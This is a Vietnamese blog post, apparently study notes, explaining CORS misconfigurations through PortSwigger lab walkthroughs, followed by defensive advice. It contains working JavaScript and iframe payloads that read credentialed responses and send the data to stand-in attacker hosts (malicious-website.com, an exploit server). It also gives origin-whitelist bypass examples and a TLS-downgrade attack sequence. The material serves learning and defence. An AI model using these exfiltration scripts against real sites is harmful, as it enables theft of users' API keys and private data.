---
layout: post
title:  "CORS - Cross-origin Resouce Sharing"
date:   2025-08-08 12:00:00 +0700
tags: PortSwigger
categories: jekyll update
---

# CORS - Cross-origin resource sharing 

## CORS là cái gì? 

CORS là cơ chế trên trình duyệt **giúp một website truy cập tài nguyên từ một website khác** (**khác domain**).
Bình thường, vì lý do bảo mật, trình duyệt chặn việc này theo luật **Same-Origin Policy (SOP)**.
*CORS giúp mở ngoại lệ, cho phép một số trang web được truy cập nếu server cho phép.*

## Same-origin policy 
Là chính sách bảo mật của trình duyệt nhằm chặn website này đọc dữ liệu từ website khác (khác domain).
Mục đích: ngăn website độc hại đọc dữ liệu riêng tư từ web khác mà người dùng đã đăng nhập.

**Trình duyệt cho phép gửi request đến website khác, nhưng không cho phép đọc response nếu khác origin.**

## Nới lỏng Same-origin policy 

SOP (Same-Origin policy) chặn ko cho phép truy cập dữ liệu từ domain khác tránh gây mất dữ liệu, nhưng mà nếu web cần tương tác với các subdomain hoặc bên thứ ba thì SOP gây bất tiện. 

**CORS** giúp nới lỏng giới hạn của SOP trong những trường hợp hợp lý và an toàn, cho phép web hiện đại hoạt động linh hoạt hơn.

## Lỗ hổng do cấu hình CORS sai 

Nhiều website hiện đại sử dụng CORS để cho phép các subdomain (ví dụ: api.example.com) hoặc bên thứ ba đáng tin cậy truy cập tài nguyên của mình. 

Thì CORS giúp website linh hoạt hơn, nhưng nếu cấu hình sai có thể khiến dữ liệu người dùng bị đánh cắp. Cần kiểm tra cẩn thận domain nào được phép truy cập và tránh cho phép quá rộng.

### Phản hồi ACAO do server tạo từ header Origin do client chỉ định 

Một số ứng dụng cần cung cấp quyền truy cập cho nhiều domain khác nhau. Việc duy trì danh sách các domain được phép yêu cầu công sức liên tục, và nếu sai sót có thể làm hỏng chức năng của ứng dụng. Vì vậy, một số ứng dụng chọn cách đơn giản là cho phép truy cập từ bất kỳ domain nào, dẫn đến rủi ro bảo mật.

Một cách để cho phép truy cập từ bất kỳ domain nào là đọc giá trị từ **header** `Origin` trong request của client, rồi phản hồi lại bằng header cho biết domain đó được phép truy cập. 

Ví dụ là: có 1 HTTP request như này: 

```HTTP
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
``` 
Và có 1 response trả về. 

```HTTP
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
``` 
Response này nói là: 
- Truy cập được cho phép từ domain đã gửi request (`malicious-website.com`)
- Các yêu cầu cross-origin được phép gửi kèm cookie (`Access-Control-Allow-Credentials: true`) 

Vì trong header có thuộc tính origin `Access-Control-Allow-Origin` điều này cho phép truy cập bất kỳ tài nguyên nào từ domain evil. 

Nếu mà response trả về các thông tin nhạy cảm như API key hoặc CSRF token. Và mình hoàn toàn có thể lấy khi xây dựng 1 script như sau: 

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};
```

### LAB01 

Ở lab này thì được cung cấp 1 account, sau khi login vào bằng `wiener:peter`, sau đó quan sát request và response thì: 

![image](https://hackmd.io/_uploads/H1uZtC-_ll.png)

Thì thấy trong phần `/accountDetails` thì có `Access-Control-Allow-Credentials: true` như vậy thì có thể là CORS có thể support. 

Để thử thì mình thử thêm 1 trường `Origin: https://example.com` vào trong header. 

![image](https://hackmd.io/_uploads/Byt0KCW_xg.png)

Thì nó xuất hiện 1 trường nữa là `Access-Control-Allow-Origin: https://example.com` 

Như vậy mình viết 1 script để thực hiện như sau: 

![image](https://hackmd.io/_uploads/rJ5H3RZulx.png)

Bắt đầu gửi tới nạn nhân thì sẽ truy cập gửi kèm thông tin nhạy cảm về địa chỉ của attacker. 

![image](https://hackmd.io/_uploads/rJGq2RWdgg.png)

Sau khi decode thì nó là: 

![image](https://hackmd.io/_uploads/r1y16R-uxe.png)

### Lỗi phân tích Header Origin 

Một số ứng dụng web cho phép truy cập từ **nhiều domain** **(origin)** bằng cách sử dụng **danh sách trắng (whitelist)** các domain được phép. Khi có yêu cầu CORS đến, ứng dụng sẽ:
- Kiểm tra Origin của request có nằm trong danh sách không.
- Nếu có, thì phản hồi lại bằng header `Access-Control-Allow-Origin` chứa chính origin đó → cho phép truy cập.

Ví dụ khi nhận 1 request bình thường là: 
```HTTP
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```

Ứng dụng sẽ kiểm tra `Origin` mà client được gửi đến. Nếu origin đó nằm trong danh sách được cho phép, ứng dụng sẽ phản hồi lại bằng header `Access-Control-Allow-Origin` chứa đúng origin đó (→ tức là cho phép truy cập từ domain đó). 

```HTTP
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
``` 

Lỗi thường xảy ra khi cấu hình danh sách domain cho phép trong CORS. Nhiều tổ chức muốn cho phép tất cả subdomain của họ hoặc subdomain của bên khác.** Họ thường dùng cách so khớp chuỗi (prefix/suffix) hoặc regex để kiểm tra origin**.
Nếu viết sai logic, có thể vô tình cho phép domain không mong muốn truy cập.

Ví dụ, 1 ứng dụng cho access đến tất cả domains kết thúc là:
`normal-website.com`, như vậy thì nó hoàn toàn có thể bypass bằng `hackernormal-website.com`. 

Hoặc cho phép tất cả các domain bắt đầu từ: `normal-website.com` attacker có thể bypass bằng `normal-website.com.evil-user.net` 

### Whitelisted `null` origin 

Trình duyệt có thể gửi header `Origin: null` trong 1 số trường hợp đặc biệt như cross-origin, đọc file local `file:`, serialize data,hoặc các request bị sandbox. 

Một số ứng dụng có thể thêm giá trị `null` vào danh sách cho phép (whitelist) origin để hỗ trợ phát triển ứng dụng ở môi trường local.

```HTTP
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
``` 

Và response trả về: 
```HTTP
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

Tấn công bằng **Origin: null** do bị whitelist sai — Kẻ tấn công có thể tạo request có Origin: null, và nếu server whitelist null thì sẽ cấp quyền truy cập trái phép từ domain khác.

Khai thác **Origin: null** bằng iframe sandbox — Kẻ tấn công có thể lợi dụng iframe với thuộc tính sandbox để gửi request có **Origin: null**, nhằm vượt qua **CORS** nếu server đã whitelist null.

```HTML
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
``` 

### LAB02 

Ở lab này thì được cung cấp 1 account, sau khi login vào bằng `wiener:peter`, sau đó quan sát request và response thì: 

![image](https://hackmd.io/_uploads/rJTe1JXuxl.png)

Mình thấy trong header có `Access-Control-Allow-Credentials: true`, sau đó mình gửi nó sang Repeater để thêm 1 trường `Origin: null`. 

![image](https://hackmd.io/_uploads/B1PV1WXuge.png)

Thì nó trả về `Access-Control-Allow-Origin: null`, thì điều đó có nghĩa ứng dụng chấp nhận CORS là `null`

Từ đây mình khai thác trên exploit server như sau: 

![image](https://hackmd.io/_uploads/S1DLzbXOgg.png)

Điều này cho phép là `allow-scripts` cho phép thực hiện script; `allow-top-navigation` cho phép thay đổi trong tab chính; `allow-forms` cho phép gửi form này. 

Và ko có `allow-same-origin` thì điều này có nghĩa gửi với `Origin: null`

![image](https://hackmd.io/_uploads/HyV14W7uex.png)

Từ đây nó trả về request và mình cần decode nó. 

![image](https://hackmd.io/_uploads/HyWlV-Qdxl.png)

### Khai thác XSS thông qua mối quan hệ tin tưởng CORS 

CORS tin nhầm domain bị XSS -> attacker dùng XSS để đọc dữ liệu của domain tin tưởng nó. 

Có 1 request là: 

```HTTP
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```
Nếu server trả về response là: 
```HTTP
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

attacker có thể tìm ra 1 lỗ hổng XSS trên `subdomain.vulnerable-website.com` có thể trích xuất API key, dùng URL: 
`https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
`

### Phá vỡ tính bảo mật của TLS do cấu hình CORS kém 

Giả sử một ứng dụng luôn sử dụng HTTPS một cách nghiêm ngặt, nhưng lại đưa vào danh sách trắng một subdomain được tin tưởng đang dùng HTTP thuần (ko mã hóa). 

Ví dụ nhận được 1 request như sau: 

```HTTP
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

Với các response này: 
```HTTP
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Trong tình huống này, attacker có khả năng chặn lưu lượng truy cập của người dùng có thể lợi dụng cấu hình CORS để xâm phạm tương tác của nạn nhân với ứng dụng. 
1. Người dùng nạn nhân thực hiện bất kỳ yêu cầu HTTP thuần nào. 
2. attacker chèn một chuyển hướng tới:
    ```http://trusted-subdomain.vulnerable-website.com```
3. Trình duyệt của nạn nhân theo chuyển hướng này. 
4. Attacker chặn yêu cầu HTTP thuần đó và trả về một phản hồi giả mạo chứa một yêu cầu CORS tới:
    ```https://vulnerable-website.com``` 
5. Trình duyệt cả nạn nhân gửi yêu cầu CORS này, kèm header `Origin: http://trusted-subdomain.vulnerable-website.com`
6. Ứng dụng cho phép yêu cầu vì đây là một origin nằm trong danh sách trắng. Dữ liệu nhạy cảm được trả về trong response.
7. Trang giả mạo của attacker có thể đọc dữ liệu nhạy cảm này và gửi nó đến bất kỳ domain nào do attacker kiểm soát. 

### LAB03 

Lab này cũng được cung cấp 1 account. Sau khi login thì nó trả về 1 request như này: 

![image](https://hackmd.io/_uploads/ByYy0bmOee.png)

Quan sát thì thấy có trường `Access-Control-Allow-Credentials` như vậy ứng dụng có thể support CORS. 

Để test thì mình thử thêm trường `Origin: http://subdomain...` xem ứng dụng phản hồi như thế nào. 

![image](https://hackmd.io/_uploads/H19zHfXdxg.png)

Nó cũng trả lại thì CORS được config cho HTTP và HTTPS. 

Khi nó kiểm tra chức năng checkstock thì: 

![image](https://hackmd.io/_uploads/BksOrMX_le.png)

Thì nó gọi tới 1 URL dùng HTTP là http://stock. vì có response nó như sau: 

![image](https://hackmd.io/_uploads/H18IPf7Ogg.png)

Và mình thử nhập test trên tham số `product` xem như thế nào trên subdomain .stock 

![image](https://hackmd.io/_uploads/Hkhy_f7_lx.png)

Thì nó bị dính Reflected XSS 

![image](https://hackmd.io/_uploads/ryJZKGQuxg.png)

Như vậy nếu mình viết 1 script để lấy CORS kèm credentials sau đó fetch tới log của exploit server.

```javascript=
<script>
    fetch('https://<LAB-ID>/accountDetails', {
    credentials: 'include'
})
.then(r => r.json())
.then(j => fetch('http://exploit-server/?key='+j.apiKey))
</script>
```

Sau đó mình encode rồi nhét nó vào tham số product trong subdomain http://stock. 

![image](https://hackmd.io/_uploads/HkJP0GXdgg.png)

Như vậy thì thấy nó chạy thành công í nên là mình exploit server mình truyền như sau: 

![image](https://hackmd.io/_uploads/BkF7t77dgg.png)

Thì ở đây truy cập 1 access-log thì nó lấy được api. 

![image](https://hackmd.io/_uploads/rkSGt7Xuxl.png)

Và sao mình biết là có apikey mà lấy thì do đây. 

![image](https://hackmd.io/_uploads/rk4OtXX_lx.png)

Từ đây mình có thể viết 1 script khác như này: 

```javascript
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener; 
    req.open('get', 'https://0ac3000003d180b8bb208da9006c00ea.web-security-academy.net/accountDetails', true);
    req.withCredentials = true;
    req.send(); 

    function reqListener() {
        location = 'https://exploit-0a7e008a037d8072bb348c8c01fa0029.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>
```

Thì cũng làm tương tự mình cũng thu được apikey. 

![image](https://hackmd.io/_uploads/HJm45mQ_eg.png)

![image](https://hackmd.io/_uploads/HkD8q77ugx.png)

## Mạng nội bộ và CORS ko kèm thông tin xác thực 

Hầu hết các tấn công CORS sẽ trả về: 
```
Access-Control-Allow-Credentials: true
``` 

Không bật Allow-Credentials ⇒ CORS chỉ cho attacker thấy dữ liệu công khai ⇒ không giúp gì nhiều ngoài intranet.

Website nội bộ (intranet) dùng IP riêng chỉ truy cập từ trong mạng, nên attacker ngoài internet không vào được.
Do chủ quan, các site này thường bảo mật kém, dễ bị khai thác nếu attacker lợi dụng trình duyệt của người trong mạng (ví dụ qua CORS) để truy cập thay cho mình.

Ví dụ cross-request với private network: 

```HTTP
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
``` 

và server trả về: 
```HTTP
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
``` 

Server nội bộ chấp nhận yêu cầu từ mọi origin mà không cần cookie.
Nếu người trong mạng nội bộ truy cập internet, attacker có thể dùng CORS từ website của mình để biến trình duyệt của nạn nhân thành proxy, truy cập tài nguyên intranet thay cho mình.

## Phòng chống CORS 

- Cấu hình đúng Access-Control-Allow-Origin: Nếu dữ liệu nhạy cảm, chỉ định rõ origin được phép, không để tùy tiện.
- Chỉ cho phép site tin cậy: Không phản chiếu origin từ request mà không kiểm tra, tránh bị lợi dụng.
- Không whitelist null: Vì origin null có thể đến từ tài liệu nội bộ hoặc request sandbox.
- Không dùng wildcard * trong mạng nội bộ: Vì người trong mạng có thể truy cập site độc hại ngoài internet.
- CORS không thay thế bảo mật server: Vẫn phải dùng xác thực, quản lý session… vì attacker có thể gửi request giả từ origin được tin cậy.